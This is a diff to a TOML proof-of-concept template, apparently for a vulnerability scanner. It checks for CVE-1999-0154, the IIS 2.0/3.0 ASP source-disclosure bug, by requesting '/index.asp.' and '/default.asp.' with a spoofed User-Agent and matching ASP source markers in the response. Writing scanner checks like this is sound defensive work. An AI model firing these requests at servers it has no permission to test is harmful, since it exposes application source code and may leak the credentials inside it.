@@ -3,8 +3,8 @@ id = "POC-AVE-1999-0007"
 name = "Microsoft IIS 2.0/3.0 ASP 源码泄露漏洞 PoC"
 author = "AVE"
 severity = "medium"
-tags = ["iis", "asp", "source-disclosure", "information-leak", "CWE-200"]
-description = "IIS 2.0 和 3.0 存在 ASP 源码泄露漏洞，通过在 URL 末尾添加点号（.）即可绕过脚本执行，直接获取 ASP 文件源码。"
+tags = ["iis", "asp", "information-disclosure", "source-code-disclosure"]
+description = "IIS 2.0 和 3.0 存在 ASP 源码泄露漏洞，远程攻击者通过在 URL 末尾添加点号（.）可读取 ASP 文件源代码。"
 vuln_id = ["CVE-1999-0154", "AVE-1999-0007"]
 
 [poc]
@@ -13,31 +13,35 @@ logic = "any"
 [[poc.requests]]
 method = "GET"
 path = "/index.asp."
-
-[[poc.requests.matchers]]
-type = "word"
-part = "body"
-words = ["<%@", "<%", "Language=", "Response.", "Server.", "Request.", "Session."]
-condition = "or"
-expect = true
+headers = [
+  { key = "User-Agent", value = "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0)" }
+]
 
 [[poc.requests.matchers]]
 type = "status"
 status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["<%", "Language=", "Response.", "Server.", "Request."]
 expect = true
 
 [[poc.requests]]
 method = "GET"
 path = "/default.asp."
-
-[[poc.requests.matchers]]
-type = "word"
-part = "body"
-words = ["<%@", "<%", "Language=", "Response.", "Server.", "Request.", "Session."]
-condition = "or"
-expect = true
+headers = [
+  { key = "User-Agent", value = "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0)" }
+]
 
 [[poc.requests.matchers]]
 type = "status"
 status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["<%", "Language=", "Response.", "Server.", "Request."]
 expect = true
